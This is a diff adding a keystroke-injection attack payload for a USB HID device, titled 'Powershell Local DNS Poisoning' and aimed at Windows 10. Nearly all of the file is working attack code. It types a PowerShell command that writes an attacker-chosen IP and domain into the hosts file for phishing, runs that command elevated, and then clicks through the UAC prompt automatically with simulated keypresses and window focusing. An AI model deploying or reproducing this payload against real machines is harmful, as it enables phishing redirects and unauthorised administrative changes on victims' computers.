@@ -1,0 +1,59 @@
+#!/bin/bash
+##########################################################################
+# Title:        Powershell Local DNS Poisoning
+# Description:  Edits the hosts file to redirect an IP to a domain
+# Author:       SammyTheBEAST
+# Version:      1
+# Category:     Phishing
+# Target:       Windows 10
+# Attackmode:   HID
+#
+# Variables:
+#     poisoned_domain:  This domain will point to the target IP
+#     target_ip:        The IP that the domain should resolve to
+# LED States:
+#     SETUP  (Magenta solid):        Set attackmode and initialize variables
+#     STAGE1 (Yellow single blink):  Modifying the hosts file
+#     STAGE2 (Yellow double blink):  Bypassing UAC
+#     FINISH (Green solid):          Script completed
+##########################################################################
+
+LED SETUP
+ATTACKMODE HID
+SET_LANGUAGE us
+
+# Options
+poisoned_domain="POISONED_DOMAIN"
+target_ip="TARGET_IP"
+
+
+##### Edit the hosts file #####
+LED STAGE1
+# Open the run prompt
+Q GUI r
+Q DELAY 500
+# Append a string to the hosts file
+Q STRING "powershell -noprofile -exec bypass -c \"Add-Content -Path \$Env:SystemRoot\System32\drivers\etc\hosts -Value '$target_ip $poisoned_domain'\""
+Q DELAY 50
+# Run as administrator
+Q CTRL-SHIFT ENTER
+Q DELAY 500
+
+
+##### Bypass UAC #####
+LED STAGE2
+# Attempt to bypass if window is already focused
+Q LEFTARROW
+Q DELAY 50
+Q ENTER
+# If the UAC window was not focused:
+# Run a powershell command to focus the window
+RUN WIN 'powershell -noprofile -exec bypass -c "(New-Object -ComObject WScript.Shell).AppActivate((get-process consent).MainWindowTitle)"'
+Q DELAY 500
+# Bypass once UAC window is focused
+Q LEFTARROW
+Q DELAY 50
+Q ENTER
+
+
+LED FINISH
